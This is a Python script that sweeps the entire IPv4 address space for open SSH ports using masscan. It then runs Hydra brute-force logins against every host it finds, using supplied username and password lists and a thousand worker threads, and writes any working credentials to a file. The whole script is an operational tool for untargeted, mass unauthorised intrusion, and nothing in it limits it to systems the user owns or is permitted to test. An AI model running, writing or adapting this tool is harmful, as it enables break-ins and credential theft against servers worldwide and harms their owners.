import os
import queue
import threading
import subprocess
import time
import ipaddress
import json

# Files
UFILE = "users.txt"
PFILE = "passes.txt"
LOGS = "valid_creds.txt"
ELOGS = "error_log.txt"
OUTPUT_FILE = "masscan_output.json"  # Define masscan output file

# IP Range
start_ip = ipaddress.IPv4Address("0.0.0.0")
end_ip = ipaddress.IPv4Address("255.255.255.254")

# Settings
RATE = "20000"
WORKERS = 1000  # Consider reducing if system resources are limited
PORT = 22
BATCH = 50000  # As an integer

q = queue.Queue()
stats = {"scanned_ips": 0, "hits": 0, "fails": 0, "errors": 0}

def save_hit(creds):
    with open(LOGS, "a") as f:
        f.write(f"{creds}\n")
    stats["hits"] += 1

def save_err(err):
    with open(ELOGS, "a") as f:
        f.write(f"{err}\n")
    stats["errors"] += 1

def brute(ip):
    print(f"[+] Running Hydra on {ip}")
    cmd = f"hydra -L {UFILE} -P {PFILE} {ip} ssh -t 4 -T 5 -W 1 -V 2>&1"
    try:
        res = subprocess.run(cmd, shell=True, capture_output=True, text=True).stdout
    except Exception as e:
        save_err(str(e))
        return

    found = False
    for line in res.splitlines():
        if "password:" in line:
            print(f"[✔] {line}")
            save_hit(line)
            found = True
        elif "failed" in line.lower() or "invalid" in line.lower():
            stats["fails"] += 1
        elif "error" in line.lower():
            save_err(line)

    if not found:
        stats["fails"] += 1

def worker():
    while True:
        ip = q.get()
        if ip is None:
            q.task_done()
            break
        print(f"[+] Worker processing IP: {ip}")
        brute(ip)
        q.task_done()

def scan():
    print("[*] Starting scan...")
    current_ip = start_ip
    while current_ip <= end_ip:
        # Calculate the end IP for the current batch (without exceeding end_ip)
        next_ip = min(current_ip + BATCH - 1, end_ip)
        cmd = (
            f"masscan -p {PORT} --open --rate={RATE} "
            f"--range {str(current_ip)}-{str(next_ip)} "
            f"--output-format=json --output-filename={OUTPUT_FILE} "
            f"--exclude 255.255.255.255"
        )
        print(f"[DEBUG] Running: {cmd}")
        subprocess.run(cmd, shell=True)

        # Parse the masscan JSON output and enqueue discovered IPs
        try:
            with open(OUTPUT_FILE, "r") as f:
                data = json.load(f)
            for entry in data:
                ip_found = entry.get("ip")
                if ip_found:
                    q.put(ip_found)
                    stats["scanned_ips"] += 1
        except Exception as e:
            print(f"[ERROR] Failed to parse masscan output: {e}")
            save_err(f"Failed to parse masscan output: {e}")

        # Move to the next batch
        current_ip = next_ip + 1
        time.sleep(1)

def start_workers():
    threads = []
    for _ in range(WORKERS):
        t = threading.Thread(target=worker)
        t.daemon = True
        t.start()
        threads.append(t)
    return threads

def show_stats():
    while True:
        time.sleep(5)
        print(f"[STATS] Scanned IPs: {stats['scanned_ips']} | Hits: {stats['hits']} | Fails: {stats['fails']} | Errors: {stats['errors']}")

def run():
    print("[*] Running...")
    start_workers()  # Start worker threads
    # Start the scanning and stats threads
    threading.Thread(target=scan, daemon=True).start()
    threading.Thread(target=show_stats, daemon=True).start()

    # Wait for the scanning queue to empty
    q.join()
    print("[*] Scan complete. Signaling workers to exit...")
    # Signal all workers to exit
    for _ in range(WORKERS):
        q.put(None)

    # Keep the main thread alive if needed
    while True:
        time.sleep(5)

if __name__ == "__main__":
    run()
